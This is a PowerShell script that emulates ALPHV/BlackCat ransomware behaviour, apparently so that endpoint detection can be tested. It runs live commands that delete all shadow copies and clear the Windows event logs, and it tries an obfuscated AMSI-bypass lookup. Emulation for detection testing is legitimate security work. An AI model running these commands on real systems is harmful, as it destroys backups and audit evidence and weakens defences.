<#
.SYNOPSIS
    ALPHV/BlackCat PowerShell Execution - DETECTION TRIGGER
.DESCRIPTION
    Uses PowerShell to delete shadow copies and clear event logs.
    TTP: T1059.001, T1490, T1070.001
#>
$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting ALPHV PowerShell Execution (T1059.001)" -ForegroundColor Cyan

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[!] WARNING: Not running as Administrator - some actions will fail" -ForegroundColor Red
}

# Step 1: Delete shadow copies via WMI (T1490)
Write-Host "`n[*] [T1490] Deleting Volume Shadow Copies via WMI..."
Write-Host "    CMD: Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"
$shadows = Get-WmiObject Win32_Shadowcopy -ErrorAction SilentlyContinue
if ($shadows) {
    Write-Host "    [*] Found $($shadows.Count) shadow copies"
    foreach ($s in $shadows) {
        try {
            $s.Delete()
            Write-Host "    [+] Deleted: $($s.ID)" -ForegroundColor Green
        } catch {
            Write-Host "    [-] Failed to delete: $_" -ForegroundColor Red
        }
    }
} else {
    Write-Host "    [-] No shadow copies found" -ForegroundColor Gray
}

# Step 2: Also try vssadmin (common ALPHV behavior)
Write-Host "`n[*] [T1490] Executing vssadmin shadow delete..."
Write-Host "    CMD: vssadmin delete shadows /all /quiet"
vssadmin delete shadows /all /quiet 2>&1

# Step 3: Clear event logs (T1070.001)
Write-Host "`n[*] [T1070.001] Clearing Windows Event Logs..."
$logs = @("Security", "System", "Application")
foreach ($log in $logs) {
    Write-Host "    CMD: wevtutil cl $log"
    wevtutil cl $log 2>&1
    Write-Host "    [+] Cleared: $log" -ForegroundColor Green
}

# Step 4: PowerShell AMSI bypass attempt (T1562.001)
Write-Host "`n[*] [T1562.001] Attempting AMSI bypass..."
Write-Host '    CMD: [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")'
try {
    $amsi = [Ref].Assembly.GetType('Sy'+'stem.Man'+'agement.Auto'+'mation.Am'+'siUtils')
    if ($amsi) {
        Write-Host "    [+] AMSI type found - bypass detection triggered" -ForegroundColor Green
    }
} catch {
    Write-Host "    [-] AMSI access blocked (EDR protection)" -ForegroundColor Red
}

Write-Host "`n[+] ALPHV PowerShell Execution Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: Shadow copy deletion, event log clearing, AMSI bypass attempt" -ForegroundColor Magenta
